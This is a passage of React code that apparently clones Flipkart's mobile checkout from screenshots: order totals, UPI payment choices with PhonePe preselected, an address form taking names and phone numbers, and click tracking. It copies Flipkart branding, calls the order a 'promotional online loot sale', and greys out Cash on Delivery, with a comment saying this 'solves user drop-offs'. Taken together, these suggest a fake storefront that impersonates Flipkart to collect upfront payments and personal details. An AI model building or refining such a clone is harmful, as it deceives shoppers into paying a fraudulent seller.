                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12, fontSize: '0.86rem' }}>
                  <span style={{ color: '#212121' }}>Discount on MRP</span>
                  <span style={{ fontWeight: 700, color: '#1B7A2F' }}>
                    −₹{discountAmount.toLocaleString('en-IN')}
                  </span>
                </div>

                {selectedDonation && (
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12, fontSize: '0.86rem' }}>
                    <span style={{ color: '#212121' }}>Flipkart Foundation Donation</span>
                    <span style={{ fontWeight: 600, color: '#212121' }}>
                      ₹{selectedDonation}
                    </span>
                  </div>
                )}

                <div style={{ height: 1, background: '#F0F0F0', margin: '10px 0' }} />

                <div style={{
                  display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                  fontSize: '1.05rem', fontWeight: 900, color: '#212121', marginBottom: 12
                }}>
                  <span>Total Amount</span>
                  <span>₹{totalAmount.toLocaleString('en-IN')}</span>
                </div>

                {/* You'll Save Green Banner */}
                <div style={{
                  background: '#E8F8F0', borderRadius: 8, padding: '8px 12px',
                  display: 'flex', alignItems: 'center', gap: 6, color: '#137333',
                  fontSize: '0.84rem', fontWeight: 700
                }}>
                  <span>🏷️</span>
                  <span>You'll Save ₹{(discountAmount - (selectedDonation || 0)).toLocaleString('en-IN')} on this order</span>
                </div>
              </div>
            </div>

            {/* 7. Trust Badges & GST Card (Screenshot 4) */}
            <div style={{
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              padding: '8px 12px', textAlign: 'center', color: '#717478', fontSize: '0.78rem'
            }}>
              <ShieldCheck size={18} color="#717478" />
              <span>Safe and secure payments. Easy returns. 100% Authentic products.</span>
            </div>

            <div style={{
              background: '#FFFFFF', borderRadius: 16, padding: '14px 18px',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
            }}>
              <div>
                <div style={{ fontSize: '0.82rem', fontWeight: 700, color: '#212121' }}>
                  Claim up to 28% GST input credit on business purchases
                </div>
                <div style={{ fontSize: '0.82rem', color: '#1967F2', fontWeight: 800, marginTop: 4, cursor: 'pointer' }}>
                  Add GSTIN number
                </div>
              </div>
              <Building size={26} color="#717478" />
            </div>

            {/* Legal Terms Footnote */}
            <div style={{
              fontSize: '0.74rem', color: '#878787', lineHeight: 1.4, textAlign: 'center',
              padding: '6px 12px 18px'
            }}>
              By proceeding, you confirm that you're above 18 years of age and you agree to Flipkart's{' '}
              <span style={{ color: '#1967F2' }}>Terms of Use</span> and{' '}
              <span style={{ color: '#1967F2' }}>Privacy Policy</span>.
            </div>
          </div>
        )}

        {/* ========================================================
            STEP 3: PAYMENTS PAGE (Screenshot 5)
           ======================================================== */}
        {currentStep === 3 && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {/* Total Amount Dropdown Banner (Screenshot 5) */}
            <div style={{
              background: '#F0F5FF', border: '1px solid #D9E6FF', borderRadius: 12,
              padding: '12px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between'
            }}>
              <div style={{
                display: 'flex', alignItems: 'center', gap: 4, color: '#1967F2',
                fontWeight: 700, fontSize: '0.95rem', cursor: 'pointer'
              }}>
                <span>Total Amount</span>
                <ChevronDown size={17} />
              </div>
              <div style={{ color: '#1967F2', fontWeight: 900, fontSize: '1.15rem' }}>
                ₹{totalAmount.toLocaleString('en-IN')}
              </div>
            </div>

            {paymentError && (
              <div style={{
                background: '#FDEDED', border: '1px solid #F5C2C7', borderRadius: 10,
                padding: '10px 14px', fontSize: '0.85rem', color: '#842029', display: 'flex', gap: 8
              }}>
                <AlertCircle size={18} color="#842029" style={{ flexShrink: 0 }} />
                <span>{paymentError}</span>
              </div>
            )}

            {/* Payment Methods Container */}
            <div style={{
              background: '#FFFFFF', borderRadius: 16, overflow: 'hidden',
              boxShadow: '0 1px 3px rgba(0,0,0,0.06)'
            }}>
              {/* Option 1: Flipkart UPI */}
              <div style={{
                padding: '16px 18px', borderBottom: '1px solid #F0F0F0',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                cursor: 'pointer'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <FlipkartBagIcon size={22} />
                  <span style={{ fontWeight: 700, fontSize: '0.95rem', color: '#212121' }}>Flipkart UPI</span>
                </div>
                <ChevronDown size={18} color="#717478" />
              </div>

              {/* Option 2: UPI (Expanded by default) */}
              <div style={{ borderBottom: '1px solid #F0F0F0' }}>
                <div
                  onClick={() => setIsUpiExpanded(prev => !prev)}
                  style={{
                    padding: '14px 18px', background: '#FAFAFA',
                    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    cursor: 'pointer', borderBottom: isUpiExpanded ? '1px solid #EEEEEE' : 'none'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                    <UpiGenericIcon size={20} />
                    <span style={{ fontWeight: 800, fontSize: '0.95rem', color: '#212121' }}>UPI</span>
                  </div>
                  {isUpiExpanded ? <ChevronUp size={18} color="#717478" /> : <ChevronDown size={18} color="#717478" />}
                </div>

                {isUpiExpanded && (
                  <div style={{ padding: '8px 16px 16px' }}>
                    {/* Sub-item: Flipkart UPI */}
                    <label style={{
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                      padding: '12px 6px', cursor: 'pointer', borderBottom: '1px solid #F6F6F6'
                    }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                        <input
                          type="radio"
                          name="upi_option"
                          checked={selectedUpiOption === 'flipkart_upi'}
                          onChange={() => setSelectedUpiOption('flipkart_upi')}
                          style={{ width: 18, height: 18, accentColor: '#1967F2' }}
                        />
                        <div>
                          <div style={{ fontWeight: 600, fontSize: '0.92rem', color: '#212121' }}>Flipkart UPI</div>
                          <div style={{ fontSize: '0.78rem', color: '#717478' }}>Punjab National Bank • XX8465</div>
                        </div>
                      </div>
                      <FlipkartBagIcon size={20} />
                    </label>

                    {/* Sub-item: Google Pay */}
                    <label style={{
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                      padding: '12px 6px', cursor: 'pointer', borderBottom: '1px solid #F6F6F6'
                    }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                        <input
                          type="radio"
                          name="upi_option"
                          checked={selectedUpiOption === 'gpay'}
                          onChange={() => setSelectedUpiOption('gpay')}
                          style={{ width: 18, height: 18, accentColor: '#1967F2' }}
                        />
                        <span style={{ fontWeight: 600, fontSize: '0.92rem', color: '#212121' }}>Google Pay</span>
                      </div>
                      <GPayIcon size={22} />
                    </label>

                    {/* Sub-item: PhonePe (SELECTED BY DEFAULT!) */}
                    <div style={{
                      background: selectedUpiOption === 'phonepe' ? '#FFFDF0' : 'transparent',
                      borderRadius: 10, padding: '10px 8px', marginTop: 4, marginBottom: 4,
                      border: selectedUpiOption === 'phonepe' ? '1.5px solid #FFD200' : 'none'
                    }}>
                      <label style={{
                        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                        cursor: 'pointer'
                      }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                          <input
                            type="radio"
                            name="upi_option"
                            checked={selectedUpiOption === 'phonepe'}
                            onChange={() => setSelectedUpiOption('phonepe')}
                            style={{ width: 19, height: 19, accentColor: '#1967F2' }}
                          />
                          <span style={{ fontWeight: 800, fontSize: '0.95rem', color: '#212121' }}>PhonePe</span>
                        </div>
                        <PhonePeIcon size={24} />
                      </label>

                      {/* Prominent Yellow Pay Button directly beneath PhonePe */}
                      {selectedUpiOption === 'phonepe' && (
                        <div style={{ marginTop: 12, paddingLeft: 31, paddingRight: 4 }}>
                          <motion.button
                            type="button"
                            onClick={handleProceedPayment}
                            disabled={isProcessingPayment}
                            whileHover={{ scale: 1.01 }}
                            whileTap={{ scale: 0.98 }}
                            style={{
                              width: '100%',
                              padding: '14px 20px',
                              background: '#FFC200',
                              color: '#111111',
                              fontWeight: 900,
                              fontSize: '1.05rem',
                              border: 'none',
                              borderRadius: 6,
                              cursor: isProcessingPayment ? 'not-allowed' : 'pointer',
                              boxShadow: '0 2px 8px rgba(255, 194, 0, 0.45)',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              gap: 8,
                            }}
                          >
                            {isProcessingPayment ? (
                              <>
                                <RefreshCw size={18} className="spin" />
                                <span>Opening PhonePe...</span>
                              </>
                            ) : (
                              <span>Pay ₹{totalAmount.toLocaleString('en-IN')}</span>
                            )}
                          </motion.button>
                        </div>
                      )}
                    </div>

                    {/* Sub-item: Punjab National Bank */}
                    <label style={{
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                      padding: '12px 6px', cursor: 'pointer', borderBottom: '1px solid #F6F6F6'
                    }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                        <input
                          type="radio"
                          name="upi_option"
                          checked={selectedUpiOption === 'pnb'}
                          onChange={() => setSelectedUpiOption('pnb')}
                          style={{ width: 18, height: 18, accentColor: '#1967F2' }}
                        />
                        <span style={{ fontWeight: 600, fontSize: '0.92rem', color: '#212121' }}>Punjab National Bank</span>
                      </div>
                      <PunjabNationalBankIcon size={22} />
                    </label>

                    {/* Sub-item: whatsapp */}
                    <label style={{
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                      padding: '12px 6px', cursor: 'pointer', borderBottom: '1px solid #F6F6F6'
                    }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                        <input
                          type="radio"
                          name="upi_option"
                          checked={selectedUpiOption === 'whatsapp'}
                          onChange={() => setSelectedUpiOption('whatsapp')}
                          style={{ width: 18, height: 18, accentColor: '#1967F2' }}
                        />
                        <span style={{ fontWeight: 600, fontSize: '0.92rem', color: '#212121' }}>whatsapp</span>
                      </div>
                      <WhatsAppIcon size={22} />
                    </label>

                    {/* Other UPI Apps */}
                    <div style={{
                      padding: '12px 6px 4px', display: 'flex', alignItems: 'center',
                      justifyContent: 'space-between', cursor: 'pointer'
                    }}>
                      <div>
                        <div style={{ fontSize: '0.88rem', color: '#1967F2', fontWeight: 700 }}>
                          Pay with other UPI Apps
                        </div>
                        <div style={{ fontSize: '0.74rem', color: '#9E9E9E', marginTop: 1 }}>
                          Offers not valid if chosen from here
                        </div>
                      </div>
                      <ChevronRight size={16} color="#1967F2" />
                    </div>

                    {/* Pay button for non-PhonePe options if selected */}
                    {selectedUpiOption !== 'phonepe' && (
                      <div style={{ marginTop: 14 }}>
                        <button
                          type="button"
                          onClick={handleProceedPayment}
                          disabled={isProcessingPayment}
                          style={{
                            width: '100%', padding: '14px', background: '#FFC200', color: '#111',
                            fontWeight: 900, fontSize: '1.05rem', border: 'none', borderRadius: 6,
                            cursor: 'pointer'
                          }}
                        >
                          {isProcessingPayment ? 'Processing...' : `Pay ₹${totalAmount.toLocaleString('en-IN')}`}
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Option 3: Credit / Debit / ATM Card */}
              <div style={{
                padding: '16px 18px', borderBottom: '1px solid #F0F0F0',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                cursor: 'pointer'
              }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                  <CreditCard size={20} color="#717478" style={{ marginTop: 2 }} />
                  <div>
                    <div style={{ fontWeight: 700, fontSize: '0.95rem', color: '#212121' }}>
                      Credit / Debit / ATM Card
                    </div>
                    <div style={{ fontSize: '0.78rem', color: '#717478', marginTop: 2 }}>
                      Add and secure cards as per RBI guidelines
                    </div>
                    <div style={{ fontSize: '0.78rem', color: '#1B7A2F', fontWeight: 700, marginTop: 2 }}>
                      Get upto 5% cashback · 2 offers available...
                    </div>
                  </div>
                </div>
                <ChevronDown size={18} color="#717478" />
              </div>

              {/* Option 4: Cash on Delivery — Explicitly UNAVAILABLE (solves user drop-offs) */}
              <div style={{
                padding: '16px 18px', borderBottom: '1px solid #F0F0F0',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                background: '#FAFAFA', opacity: 0.85
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <span style={{ fontSize: '1.2rem', filter: 'grayscale(1)' }}>💵</span>
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.95rem', color: '#717478' }}>
                      Cash on Delivery
                    </div>
                    <div style={{ fontSize: '0.75rem', color: '#9E9E9E' }}>
                      Not supported for promotional online loot sale
                    </div>
                  </div>
                </div>
                <span style={{
                  fontSize: '0.74rem', fontWeight: 800, color: '#D32F2F', background: '#FFEBEE',
                  padding: '3px 8px', borderRadius: 4
                }}>
                  Unavailable
                </span>
              </div>

              {/* Option 5: Have a Flipkart Gift Card? */}
              <div style={{
                padding: '16px 18px', borderBottom: '1px solid #F0F0F0',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                cursor: 'pointer'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <Gift size={20} color="#717478" />
                  <span style={{ fontWeight: 600, fontSize: '0.95rem', color: '#212121' }}>
                    Have a Flipkart Gift Card?
                  </span>
                </div>
                <span style={{
                  fontSize: '0.85rem', fontWeight: 800, color: '#1967F2', background: '#F0F5FF',
                  width: 24, height: 24, borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center'
                }}>
                  %
                </span>
              </div>

              {/* Option 6: EMI Unavailable */}
              <div style={{
                padding: '16px 18px', display: 'flex', alignItems: 'center',
                justifyContent: 'space-between', background: '#FAFAFA', opacity: 0.85
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <span style={{ fontSize: '1.1rem', color: '#717478', fontWeight: 800 }}>%</span>
                  <span style={{ fontWeight: 600, fontSize: '0.95rem', color: '#717478' }}>EMI</span>
                </div>
                <span style={{
                  fontSize: '0.74rem', fontWeight: 800, color: '#717478', background: '#EAEAEA',
                  padding: '3px 8px', borderRadius: 4
                }}>
                  Unavailable ®
                </span>
              </div>
            </div>

            {/* Footer Trust Marker (Screenshot 5) */}
            <div style={{
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              padding: '16px 0', color: '#717478', fontSize: '0.82rem', fontWeight: 600
            }}>
              <FlipkartBagIcon size={18} />
              <span>35 Crore happy customers and counting!</span>
            </div>
          </div>
        )}
      </main>

      {/* ─── Sticky Bottom Bar for Step 2 (Confirm Details) ─── */}
      {currentStep === 2 && (
        <div style={{
          position: 'fixed', bottom: 0, left: 0, right: 0, zIndex: 50,
          background: '#FFFFFF', boxShadow: '0 -2px 10px rgba(0,0,0,0.08)'
        }}>
          {/* Top Green Savings Banner */}
          <div style={{
            background: '#E8F8F0', padding: '5px 16px', display: 'flex',
            alignItems: 'center', justifyContent: 'center', color: '#137333',
            fontSize: '0.78rem', fontWeight: 700
          }}>
            <span>You'll save ₹{(discountAmount - (selectedDonation || 0)).toLocaleString('en-IN')} on this order</span>
          </div>

          {/* Bar Action Row */}
          <div style={{
            maxWidth: 540, margin: '0 auto', padding: '10px 16px',
            display: 'flex', alignItems: 'center', justifyContent: 'space-between'
          }}>
            <div>
              <div style={{ textDecoration: 'line-through', color: '#878787', fontSize: '0.82rem', lineHeight: 1 }}>
                ₹{mrp.toLocaleString('en-IN')}
              </div>
              <div style={{ fontSize: '1.25rem', fontWeight: 900, color: '#212121', marginTop: 2 }}>
                ₹{totalAmount.toLocaleString('en-IN')}
              </div>
            </div>

            <motion.button
              type="button"
              onClick={() => {
                // Advance to Step 3 Payments
                trackUserClick('flipkart_continue_step2', {
                  product_id: product.id,
                  has_address: Boolean(address),
                }, product.id)
                window.history.pushState({ step: 3 }, '')
                setCurrentStep(3)
                window.scrollTo({ top: 0, behavior: 'smooth' })
              }}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.97 }}
              style={{
                background: '#FFC200',
                color: '#111111',
                fontWeight: 900,
                fontSize: '1.05rem',
                padding: '12px 42px',
                borderRadius: 4,
                border: 'none',
                cursor: 'pointer',
                boxShadow: '0 2px 8px rgba(255, 194, 0, 0.45)',
              }}
            >
              Continue
            </motion.button>
          </div>
        </div>
      )}

      {/* ─── Address Bottom Sheet / Modal (Matches Screenshot 2) ─── */}
      <AnimatePresence>
        {showAddressModal && (
          <div style={{
            position: 'fixed', inset: 0, zIndex: 100, display: 'flex',
            alignItems: 'flex-end', justifyContent: 'center'
          }}>
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowAddressModal(false)}
              style={{
                position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)',
                backdropFilter: 'blur(2px)'
              }}
            />

            {/* Modal Card */}
            <motion.div
              initial={{ y: '100%' }}
              animate={{ y: 0 }}
              exit={{ y: '100%' }}
              transition={{ type: 'spring', damping: 26, stiffness: 280 }}
              style={{
                position: 'relative', width: '100%', maxWidth: 500,
                background: '#FFFFFF', borderTopLeftRadius: 20, borderTopRightRadius: 20,
                padding: '20px 20px 28px', maxHeight: '90vh', overflowY: 'auto',
                boxShadow: '0 -6px 25px rgba(0,0,0,0.2)', zIndex: 101
              }}
            >
              {/* Header */}
              <div style={{
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                marginBottom: 14
              }}>
                <h2 style={{ fontSize: '1.25rem', fontWeight: 800, color: '#212121', margin: 0 }}>
                  Deliver To
                </h2>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <FlipkartBagIcon size={24} />
                  <button
                    type="button"
                    onClick={() => setShowAddressModal(false)}
                    style={{
                      background: 'none', border: 'none', padding: 4, cursor: 'pointer',
                      color: '#717478', display: 'flex'
                    }}
                  >
                    <X size={22} />
                  </button>
                </div>
              </div>

              {/* Yellow Alert Box (Screenshot 2) */}
              <div style={{
                background: '#FFF8E7', border: '1px solid #FFE4A0', borderRadius: 8,
                padding: '10px 14px', display: 'flex', gap: 8, marginBottom: 18,
                fontSize: '0.82rem', color: '#855E00', lineHeight: 1.4
              }}>
                <span style={{ fontSize: '1rem', flexShrink: 0 }}>ⓘ</span>
                <span>Ensure your address details are accurate for a smooth delivery experience</span>
              </div>

              {addressError && (
                <div style={{
                  background: '#FDEDED', border: '1px solid #F5C2C7', borderRadius: 6,
                  padding: '8px 12px', fontSize: '0.82rem', color: '#842029', marginBottom: 14
                }}>
                  ⚠️ {addressError}
                </div>
              )}

              <form onSubmit={handleSaveAddress} style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                {/* 1. Flat/House/building name */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 4 }}>
                    Flat/House/building name *
                  </label>
                  <input
                    type="text"
                    required
                    value={addrFlat}
                    onChange={e => setAddrFlat(e.target.value)}
                    placeholder="e.g. 5, Near Main Market"
                    style={{
                      width: '100%', padding: '12px 14px', borderRadius: 8,
                      border: '1.5px solid #D0D0D0', fontSize: '0.95rem', color: '#212121',
                      outline: 'none', boxSizing: 'border-box'
                    }}
                  />
                </div>

                {/* 2. Area / Sector / Locality with Change button */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 4 }}>
                    Area / Sector / Locality
                  </label>
                  <div style={{
                    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    padding: '10px 14px', borderRadius: 8, background: '#F8F9FA',
                    border: '1.5px solid #E4E4E4'
                  }}>
                    <div>
                      <div style={{ fontSize: '0.88rem', fontWeight: 700, color: '#212121' }}>
                        {addrArea || 'Ghorasahan, Near Block Office'}
                      </div>
                      <div style={{ fontSize: '0.78rem', color: '#717478', marginTop: 1 }}>
                        East Champaran, Bihar, 845303
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        const newLoc = prompt('Enter your Area / City / Pincode:', addrArea || 'East Champaran, Bihar, 845303')
                        if (newLoc) setAddrArea(newLoc)
                      }}
                      style={{
                        padding: '6px 14px', border: '1.5px solid #1967F2', borderRadius: 6,
                        background: '#FFFFFF', color: '#1967F2', fontWeight: 800,
                        fontSize: '0.82rem', cursor: 'pointer'
                      }}
                    >
                      Change
                    </button>
                  </div>
                </div>

                {/* 3. Enter your full name */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 4 }}>
                    Enter your full name *
                  </label>
                  <input
                    type="text"
                    required
                    value={addrName}
                    onChange={e => setAddrName(e.target.value)}
                    placeholder="e.g. Rajiv Srivastawa"
                    style={{
                      width: '100%', padding: '12px 14px', borderRadius: 8,
                      border: '1.5px solid #D0D0D0', fontSize: '0.95rem', color: '#212121',
                      outline: 'none', boxSizing: 'border-box'
                    }}
                  />
                </div>

                {/* 4. 10-digit mobile number */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 4 }}>
                    10-digit mobile number *
                  </label>
                  <input
                    type="tel"
                    required
                    maxLength={10}
                    value={addrPhone}
                    onChange={e => setAddrPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="e.g. 9801947855"
                    style={{
                      width: '100%', padding: '12px 14px', borderRadius: 8,
                      border: '1.5px solid #D0D0D0', fontSize: '0.95rem', color: '#212121',
                      outline: 'none', boxSizing: 'border-box'
                    }}
                  />
                </div>

                {/* 5. Alternate phone number (Optional) */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 4 }}>
                    Alternate phone number (Optional)
                  </label>
                  <input
                    type="tel"
                    maxLength={10}
                    value={addrAltPhone}
                    onChange={e => setAddrAltPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="Optional second number"
                    style={{
                      width: '100%', padding: '12px 14px', borderRadius: 8,
                      border: '1.5px solid #D0D0D0', fontSize: '0.95rem', color: '#212121',
                      outline: 'none', boxSizing: 'border-box'
                    }}
                  />
                </div>

                {/* Type of address (Home / Work pills) */}
                <div>
                  <label style={{ display: 'block', fontSize: '0.78rem', color: '#717478', fontWeight: 600, marginBottom: 8 }}>
                    Type of address
                  </label>
                  <div style={{ display: 'flex', gap: 10 }}>
                    <button
                      type="button"
                      onClick={() => setAddrType('home')}
                      style={{
                        padding: '8px 18px', borderRadius: 8,
                        border: addrType === 'home' ? '1.5px solid #1967F2' : '1px solid #D0D0D0',
                        background: addrType === 'home' ? '#F0F5FF' : '#FFFFFF',
                        color: addrType === 'home' ? '#1967F2' : '#212121',
                        fontWeight: 700, fontSize: '0.88rem', cursor: 'pointer',
                        display: 'flex', alignItems: 'center', gap: 6
                      }}
                    >
                      <FlipkartHomeIcon size={16} />
                      <span>Home</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => setAddrType('work')}
                      style={{
                        padding: '8px 18px', borderRadius: 8,
                        border: addrType === 'work' ? '1.5px solid #1967F2' : '1px solid #D0D0D0',
                        background: addrType === 'work' ? '#F0F5FF' : '#FFFFFF',
                        color: addrType === 'work' ? '#1967F2' : '#212121',
                        fontWeight: 700, fontSize: '0.88rem', cursor: 'pointer',
                        display: 'flex', alignItems: 'center', gap: 6
                      }}
                    >
                      <Building size={16} />
                      <span>Work</span>
                    </button>
                  </div>
                </div>

                {/* Big Blue Update Address Button */}
                <button
                  type="submit"
                  style={{
                    marginTop: 10, width: '100%', padding: '14px',
                    background: '#1967F2', color: '#FFFFFF', fontWeight: 800,
                    fontSize: '1rem', border: 'none', borderRadius: 8, cursor: 'pointer',
                    boxShadow: '0 2px 10px rgba(25, 103, 242, 0.35)'
                  }}
                >
                  Update address
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  )
}
